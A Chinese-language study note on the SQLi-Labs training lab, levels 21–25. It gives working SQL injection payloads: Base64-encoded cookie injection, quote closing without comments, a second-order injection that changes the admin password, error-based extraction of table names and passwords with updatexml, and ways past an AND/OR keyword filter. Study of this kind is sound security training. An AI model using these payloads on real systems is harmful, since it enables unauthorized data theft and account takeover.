# 2026-08-03 SQLi-Labs 进阶实战（Less-21~25）

> 前置笔记：[Less-17~20 进阶 + 注入点识别](./2026-08-02-SQLi-Labs进阶与注入点识别.md)

---

## 一、Less-21：Cookie 注入 + Base64 编码（`'` 闭合）

### 1.1 注入点

Cookie 的 `uname` 字段，值经过 **Base64 编码**后传输。

```http
Cookie: uname=YWRtaW4=   ← "admin" 的 Base64
```

Less-20 是明文 Cookie 注入，Less-21 加了一层编码。本质一样，区别在于**构造 Payload 后要先 Base64 编码再放进 Cookie**。

### 1.2 后端处理流程

```
Cookie: uname=Base64(Payload)
    ↓
后端 Base64 解码 → 得到明文 Payload
    ↓
拼入 SQL：SELECT * FROM users WHERE username=('明文 Payload')
    ↓
闭合方式：(单引号 + 括号)
```

### 1.3 Payload 构造步骤

```
步骤 1：写出明文 Payload（闭合 ('  ')）
   ') UNION SELECT 1,2,database()#

步骤 2：Base64 编码
   在线工具 / Burp Decoder / Python base64.b64encode()

步骤 3：放入 Cookie
   Cookie: uname=JykpIFVOSU9OIFNFTEVDVCAxLDIsZGF0YWJhc2UoKSM=
```

### 1.4 报错注入版

```
明文：') AND updatexml(1,concat(0x7e,database()),1) AND ('
编码后放入 Cookie → 爆数据库名
```

---

## 二、Less-22：Cookie 注入 + Base64 编码（`"` 闭合）

与 Less-21 完全相同的套路，唯一的区别是**闭合符号从单引号变双引号**。

```sql
-- Less-21 闭合：')
-- Less-22 闭合：")

明文 Payload：
" UNION SELECT 1,2,database()#
" AND updatexml(1,concat(0x7e,database()),1) AND "
```

**判断方法**：先拿 `"` 和 `"` 分别测试 Cookie 编码后的响应，报错信息会暴露正确的闭合符号。

---

## 三、Less-23：注释符被过滤

### 3.1 问题

`--+` 和 `#` 被过滤了，注释法失效。

### 3.2 解决方案：用 `'` 自己闭合自己

```sql
-- 原来：?id=1' AND 1=1 --+
-- Less-23：?id=1' AND '1'='1

-- 拼入后：
SELECT * FROM users WHERE id='1' AND '1'='1' LIMIT 0,1
                            ↑         ↑
                    第一个 ' 闭合 id   最后一个 ' 被 WHERE 自带的 ' 消费
                    中间的 '1'='1' 形成一个完整的比较表达式
```

**原理**：`id='1'` 之后用 `AND '1'='1` 做逻辑真判断，而 `1'` 末尾的 `'` 正好和 SQL 语句末尾的 `'` 配成一对，不需要注释。

### 3.3 报错注入版

```sql
?id=1' AND updatexml(1,concat(0x7e,database()),1) AND '1'='1
```

---

## 四、Less-24：二次注入（Second-Order SQL Injection）

### 4.1 场景

页面功能：**注册 → 登录 → 修改密码**。

### 4.2 原理（关键！）

```
第一次请求（注册）：恶意数据被 mysql_real_escape_string() 转义后存入数据库
        ↓
       存入库中的是原始恶意数据（转义符只在拼 SQL 时生效，不会存进表）
        ↓
第二次请求（修改密码）：从数据库读出的恶意数据直接拼入 UPDATE 语句
        ↓
       没有再次转义 → 注入触发！
```

### 4.3 核心概念：转义到底干了什么？

```php
// 用户注册 admin'#
$input = "admin'#";

// mysql_real_escape_string() 做的事：
$safe = mysql_real_escape_string($input);  // 结果: "admin\'#"
//                                               ↑ 在 ' 前加 \

// 拼入 INSERT：
// INSERT INTO users VALUES ('admin\'#', '密码')
//                              ↑
//              \' 在 SQL 里代表一个字面单引号，不是一个字符串结束符
//              所以数据库存的 = admin'#（反斜杠被 MySQL 引擎"吃掉"了）
```

| 阶段 | `'` 经过什么 | 结果 |
|------|-------------|------|
| 用户输入 | — | `admin'#` |
| 转义后 | `mysql_real_escape_string()` | `admin\'#` |
| MySQL 解析 INSERT | SQL 引擎把 `\'` 解析为字面 `'` | 存入 `admin'#` |
| 读出后拼 UPDATE | **没有**再次转义 | 直接拼 `admin'#` → 注入成功 |

> **一句话**：转义保护的是"当前这次拼 SQL"，不管"以后"。数据绕一圈回来，如果不重新转义，就是个未被处理的炸弹。

### 4.4 攻击步骤

```
Step 1：注册恶意用户名
   admin'#

Step 2：登录 admin'#

Step 3：修改自己的密码（任意新密码）
   → 后端执行：
   UPDATE users SET password = '新密码' WHERE username = 'admin'#'
                                                       ↑
                                         # 注释掉后面的内容
   → 实际效果：admin 的密码被你改了
```

### 4.5 进阶：二次注入 + 报错注入（无回显照样查数据）

修改密码没有数据回显？用报错注入：

```
注册用户名：admin' AND updatexml(1,concat(0x7e,database()),1) AND '

改密码时触发的 SQL：
UPDATE users SET password = 'xxx'
WHERE username = 'admin' AND updatexml(1,concat(0x7e,database()),1) AND ''
                           ↑
                   报错函数在这里执行 → 页面爆出数据库名
```

逐级查询：
```sql
-- 查表
a' OR updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)),1) OR '

-- 查字段
a' OR updatexml(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)),1) OR '

-- 拿数据
a' OR updatexml(1,concat(0x7e,(SELECT password FROM users WHERE username='admin' LIMIT 0,1)),1) OR '
```

> ⚠️ 每次测试需要**重新注册**一个新的恶意用户名（被用过的已经生效了）。

### 4.6 长度限制问题

如果 Payload 太长导致注册的用户名被数据库 `VARCHAR(N)` 截断：

| 方案 | 示例 |
|------|------|
| 精简 Payload | `extractvalue` 比 `updatexml` 短 |
| 去空格 | `a'/**/OR/**/extractvalue(1,concat(0x7e,database()))/**/OR/**/'` |
| 缩短前缀 | 用户名用 `a'` 而不是 `admin'` |

---

## 五、Less-25：AND / OR 关键字过滤

### 5.1 源码分析

```php
function blacklist($id)
{
    $id= preg_replace('/or/i',"", $id);   // 删掉所有 or（不区分大小写）
    $id= preg_replace('/AND/i',"", $id);  // 删掉所有 AND（不区分大小写）
    return $id;
}
```

**PHP `preg_replace` 的本质**：字符串替换。在字符串里找到连续的 `and`（或 `or`）字符就删掉。

### 5.2 绕过手法

| 方法 | Payload | 原理 |
|------|---------|------|
| **双写** | `anandd` | 删掉中间的 `and` → 剩下 `and`（两边字符拼在一起） |
| `&&` / `\|\|` | `&&` / `\|\|` | 完全绕开 `and`/`or` 这两个词 |
| `%26%26` / `%7C%7C` | URL 编码后的 `&&` / `\|\|` | `&` 在 URL 里是参数分隔符，必须编码 |

### 5.3 双写 — 最稳方案

```
PHP 视角：a-n-a-n-d-d → 找到中间的 "and" → 删掉 → a + nd = "and"
         ↑ 字符串拼接，字符挨在一起就行
```

```sql
?id=1' anANDd updatexml(1,concat(0x7e,database()),1) anANDd '
-- 过滤后 →
?id=1' and updatexml(1,concat(0x7e,database()),1) and '
```

### 5.4 `&&` / `\|\|` — 另辟蹊径

```sql
# ⚠️ & 在 URL 中是参数分隔符，必须 URL 编码

?id=1' %26%26 updatexml(1,concat(0x7e,database()),1) %26%26 '    ← &&
?id=1' %7C%7C updatexml(1,concat(0x7e,database()),1) %7C%7C '    ← ||
```

### 5.5 为什么 `a/**/nd` 内联注释拆词**不行**？（深度）

这是今天最有价值的发现：

```
a/**/nd 在 PHP 和 MySQL 中被以不同方式处理：

PHP preg_replace（字符串替换）:
  "a/**/nd" → 扫描字符 → 没有连续的 "and"/"or" → 放行 ✅

MySQL 词法分析器（token 解析）:
  "a/**/nd" → 切成 token：[a] [/**/] [nd]
           → 扔掉注释 token：[a] [nd]
           → "a" 和 "nd" 是两个独立的 token
           → 不会再粘回去，不会变成 "AND" 关键字 ❌
```

**一张图说清楚**：

```
双写绕过 (anandd)            注释拆词 (a/**/nd)
─────────────────          ─────────────────────
a                           a       → token "identifier"
n                           /**/    → token "comment"（被丢弃）
a    ← "and" 被 PHP 删掉    n       → token "identifier"
n                           d       → token "identifier"
d                           
↓ PHP 过滤后                ↓ MySQL 解析后
"and" ← 连续字符串         "and" 永远不会出现
↓ MySQL                     ↓ MySQL
一个 token: AND ✅          两个 token: a + nd ❌
```

**核心认知**：PHP 干的是**字符串层面**的匹配替换，MySQL 干的是**词法层面**的 token 解析。绕过 PHP 过滤器不等于骗过 MySQL 解析器——两种完全不同的规则。

> 💡 这个知识点超出了 Less-25 本身——它揭示了"字符串过滤"和"词法分析"之间的鸿沟，是所有 WAF 绕过的底层逻辑。

---

## 六、Less-21~25 总结对照表

| 关卡 | 核心考点 | 注入位置 | 关键手法 |
|------|---------|---------|---------|
| Less-21 | Cookie + Base64 编码 | Cookie `uname`（`'` 闭合） | 构造 Payload → Base64 编码 → 放 Cookie |
| Less-22 | 同上，闭合符号不同 | Cookie `uname`（`"` 闭合） | 先测闭合符号，其余同 Less-21 |
| Less-23 | 注释符被过滤 | GET `?id=` | 用 `AND '1'='1` 替代 `--+`，自己闭合自己的引号 |
| Less-24 | **二次注入** | 注册用户名 → 存入 → UPDATE 读出触发 | 写入时被转义 ≠ 安全，读出重拼才是漏洞点 |
| Less-25 | AND/OR 关键词过滤 | GET `?id=` | 双写 / `&&` / `\|\|` / URL 编码；`/**/` 拆词不可行 |

### 关联笔记

- [Less-17~20 进阶 + 注入点识别](./2026-08-02-SQLi-Labs进阶与注入点识别.md) — Cookie 明文注入 / INSERT / UPDATE / 消费法
- [SQL 注入 WAF 绕过技术体系](./2026-07-30-SQL注入WAF绕过技术与实战.md) — 双写 / 大小写 / 内联注释 / 编码绕过
- [高级注入拓展（二次注入 / DNSLog 等）](./2026-07-29-高级注入拓展.md) — 二次注入原理详解

> ⚠️ 声明：以上技术仅用于授权靶场和渗透测试授权目标，未经授权使用属于违法行为。
